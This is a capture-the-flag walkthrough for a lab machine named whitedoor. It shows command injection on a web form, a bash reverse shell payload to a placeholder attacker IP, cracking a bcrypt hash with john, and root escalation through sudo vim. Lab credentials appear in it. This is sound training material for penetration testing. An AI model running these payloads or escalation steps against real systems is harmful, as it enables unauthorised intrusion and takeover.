# whitedoor.hvm

MACHINE IP: 192.168.0.107

Nmap scan:
        - Open ports: 80, 21, 22
        - Nmap detects that anonymous ftp login allowed
        - Contains a README.txt file. Let's check it out.

Website:
The port executes only the ls command. But if we input something like `ls; whoami` we get the output for both commands.

Let's use this to obtain a reverse shell.

I'm going to use this particular payload:
```bash
/bin/bash -c 'bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1
```

This spawns us a reverse shell as www-data. Time to try and upgrade.

In the /home/whiteshell/Desktop/.my_secret_password.txt, we can find a username and password (probably encrypted)
`whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K`

Just by some form of random experimentation, or actually, putting this password through this website: https://www.tunnelsup.com/hash-analyzer/ 
we find that this password is encoded using base64 2 times. So decrpyting this twice we get
`whiteshell:Th1sIsTh3P4sSwOrDblac5`

Now running linpeas on this login, we find a file in the user Gonzalo called my secret hash (very inconspicuous :|).
`$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6`

Let's decrypt this with john.
```bash
john --format=bcrypt crack.txt
```

Here, crack.txt is the file where the password is stored. I found that it is a bcrypt hash by running it thru the hash analyzer of dcode.fr (an online tool).

On decrypting we get the password as:
`qwertyuiop`

So the username:password pair will be:
`Gonzalo:qwertyuiop`

This will get us the user flag.

Time to see what we can do to PE. Time to bring in our old friend, `linpeas.sh`

Now, we cant download to our base user folder. But I had already downloaded it to */tmp/privesc* so I ran the file from there.

It says that vim can be run as sudo. This means that any command run on vim will be run as root. Time to use this to get root.

So, I found that running the command
```bash
sudo /usr/bin/vim
```

And entering the password of Gonzalo will run vim as root. This allowed us to run root commands. So I type the command in normal mode
```vim
:!/bin/sh
```

To get a root shell. 

Voila! We have completely owned the system.

**NOTE: For binary privesc, research GTFObins for linux. It provides useful PE vectors.**

